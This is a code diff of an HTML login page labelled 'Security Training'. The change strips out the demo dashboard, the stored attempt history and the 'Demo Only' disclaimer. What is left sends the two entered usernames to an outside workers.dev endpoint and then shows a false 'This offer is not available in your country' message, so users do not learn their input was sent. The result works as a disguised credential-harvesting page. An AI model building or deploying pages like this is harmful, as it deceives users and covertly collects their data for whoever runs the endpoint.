@@ -7,7 +7,9 @@
 <title>Security Training</title>
 
 <style>
-* { box-sizing: border-box; }
+* {
+  box-sizing: border-box;
+}
 
 body {
   margin: 0;
@@ -69,22 +71,13 @@ input:focus {
   cursor: pointer;
 }
 
-.primary:hover { background: #eee900; }
+.primary:hover {
+  background: #eee900;
+}
 
 .primary:disabled {
   opacity: 0.6;
   cursor: wait;
-}
-
-.secondary {
-  background: none;
-  border: none;
-  color: #444;
-  text-decoration: underline;
-  cursor: pointer;
-  margin-top: 18px;
-  width: 100%;
-  padding: 10px;
 }
 
 .result {
@@ -95,285 +88,114 @@ input:focus {
   overflow-wrap: anywhere;
 }
 
-.hidden { display: none; }
-
-.stats {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 10px;
-  margin: 20px 0;
-}
-
-.stat {
-  background: #f4f4f4;
-  border-radius: 12px;
-  padding: 15px;
-  text-align: center;
-}
-
-.stat strong {
-  display: block;
-  font-size: 25px;
-  margin-bottom: 5px;
-}
-
-.stat span {
-  color: #666;
-  font-size: 12px;
-}
-
-.history {
-  max-height: 300px;
-  overflow-y: auto;
-}
-
-.entry {
-  padding: 12px;
-  border-bottom: 1px solid #eee;
-  font-size: 13px;
-  overflow-wrap: anywhere;
-}
-
-.entry small {
-  display: block;
-  margin-top: 5px;
-  color: #777;
-}
-
-.footer {
-  text-align: center;
-  font-size: 11px;
-  color: #777;
-  margin-top: 20px;
-}
-
-h1 {
-  text-align: center;
-  font-size: 26px;
+.error {
+  color: #d00000;
+  font-weight: bold;
 }
 </style>
 </head>
 
 <body>
+
 <div class="container">
 
-  <section id="loginPage">
-    <p class="subtitle">
-      Enter two test usernames
-    </p>
+  <p class="subtitle">
+    Enter two test usernames
+  </p>
 
-    <form id="loginForm">
-      <label for="username">Username</label>
-      <input
-        id="username"
-        type="text"
-        maxlength="40"
-        autocomplete="off"
-        required
-      >
+  <form id="loginForm">
 
-      <label for="username2">Username 2</label>
-      <input
-        id="username2"
-        type="text"
-        maxlength="40"
-        autocomplete="off"
-        required
-      >
+    <label for="username">Username</label>
+    <input
+      id="username"
+      type="text"
+      maxlength="40"
+      autocomplete="off"
+      required
+    >
 
-      <button class="primary" type="submit" id="sendButton">
-        Log In
-      </button>
-    </form>
+    <label for="username2">Username 2</label>
+    <input
+      id="username2"
+      type="text"
+      maxlength="40"
+      autocomplete="off"
+      required
+    >
 
-    <div class="result" id="result"></div>
-
-    <button class="secondary" id="openDashboard">
-      View Training Results
-    </button>
-  </section>
-
-  <section id="dashboard" class="hidden">
-    <h1>Training Dashboard</h1>
-    <p class="subtitle">Local demonstration results</p>
-
-    <div class="stats">
-      <div class="stat">
-        <strong id="total">0</strong>
-        <span>Total attempts</span>
-      </div>
-      <div class="stat">
-        <strong id="successful">0</strong>
-        <span>Sent demos</span>
-      </div>
-    </div>
-
-    <h3>Attempt History</h3>
-    <div id="history" class="history"></div>
-
-    <button class="primary" id="backButton">
-      Back to Login
+    <button
+      class="primary"
+      type="submit"
+      id="sendButton"
+    >
+      Log In
     </button>
 
-    <button class="secondary" id="clearButton">
-      Clear Local Results
-    </button>
+  </form>
 
-    <div class="footer">
-      Demo Only — No passwords collected.
-    </div>
-  </section>
+  <div class="result" id="result" role="status"></div>
 
 </div>
 
 <script>
-const STORAGE_KEY = "twoUsernameDemoAttempts";
-
 const WORKER_URL =
   "https://soft-wildflower-8b8f.gxdhdehdd.workers.dev/";
 
-const loginPage = document.getElementById("loginPage");
-const dashboard = document.getElementById("dashboard");
+const form = document.getElementById("loginForm");
 const result = document.getElementById("result");
 const sendButton = document.getElementById("sendButton");
 
-function getAttempts() {
-  try {
-    return JSON.parse(
-      localStorage.getItem(STORAGE_KEY) || "[]"
-    );
-  } catch {
-    return [];
-  }
-}
+form.addEventListener("submit", async (event) => {
+  event.preventDefault();
 
-function saveAttempts(attempts) {
-  localStorage.setItem(
-    STORAGE_KEY,
-    JSON.stringify(attempts)
-  );
-}
+  const username = document
+    .getElementById("username").value.trim();
 
-document.getElementById("loginForm")
-  .addEventListener("submit", async (event) => {
-    event.preventDefault();
+  const username2 = document
+    .getElementById("username2").value.trim();
 
-    const username = document
-      .getElementById("username").value.trim();
-
-    const username2 = document
-      .getElementById("username2").value.trim();
-
-    if (!username || !username2) return;
-
-    sendButton.disabled = true;
-    result.textContent = "Sending...";
-    result.style.color = "#444";
-
-    try {
-      const response = await fetch(WORKER_URL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          event: "demo_usernames",
-          username: username,
-          username2: username2
-        })
-      });
-
-      if (!response.ok) {
-        throw new Error("HTTP " + response.status);
-      }
-
-      const attempts = getAttempts();
-
-      attempts.unshift({
-        username: username,
-        username2: username2,
-        time: new Date().toLocaleString()
-      });
-
-      saveAttempts(attempts.slice(0, 100));
-
-      result.replaceChildren();
-
-      const first = document.createElement("div");
-      first.textContent = "Username: " + username;
-
-      const second = document.createElement("div");
-      second.textContent = "Username 2: " + username2;
-
-      const status = document.createElement("div");
-      status.textContent = "Sent successfully!";
-      status.style.color = "green";
-
-      result.append(first, second, status);
-
-    } catch (error) {
-      result.textContent =
-        "Sending failed. Check Cloudflare connection.";
-      result.style.color = "#b42318";
-      console.error(error);
-    } finally {
-      sendButton.disabled = false;
-    }
-  });
-
-function renderDashboard() {
-  const attempts = getAttempts();
-
-  document.getElementById("total")
-    .textContent = attempts.length;
-
-  document.getElementById("successful")
-    .textContent = attempts.length;
-
-  const history = document.getElementById("history");
-  history.replaceChildren();
-
-  if (!attempts.length) {
-    history.textContent = "No attempts recorded yet.";
+  if (!username || !username2) {
     return;
   }
 
-  attempts.forEach(a => {
-    const entry = document.createElement("div");
-    entry.className = "entry";
+  sendButton.disabled = true;
+  result.classList.remove("error");
+  result.textContent = "Sending...";
 
-    const first = document.createElement("strong");
-    first.textContent = a.username;
+  try {
+    const response = await fetch(WORKER_URL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        event: "demo_usernames",
+        username: username,
+        username2: username2
+      })
+    });
 
-    const second = document.createElement("div");
-    second.textContent = "Username 2: " + a.username2;
+    if (!response.ok) {
+      throw new Error("HTTP " + response.status);
+    }
 
-    const time = document.createElement("small");
-    time.textContent = a.time;
+    result.textContent =
+      "This offer is not available in your country.";
 
-    entry.append(first, second, time);
-    history.appendChild(entry);
-  });
-}
+    result.classList.add("error");
 
-document.getElementById("openDashboard")
-  .addEventListener("click", () => {
-    renderDashboard();
-    loginPage.classList.add("hidden");
-    dashboard.classList.remove("hidden");
-  });
+  } catch (error) {
+    result.textContent =
+      "Connection error. Please try again.";
 
-document.getElementById("backButton")
-  .addEventListener("click", () => {
-    dashboard.classList.add("hidden");
-    loginPage.classList.remove("hidden");
-  });
+    result.classList.add("error");
+    console.error(error);
 
-document.getElementById("clearButton")
-  .addEventListener("click", () => {
-    localStorage.removeItem(STORAGE_KEY);
-    renderDashboard();
-  });
+  } finally {
+    sendButton.disabled = false;
+  }
+});
 </script>
+
 </body>
 </html>
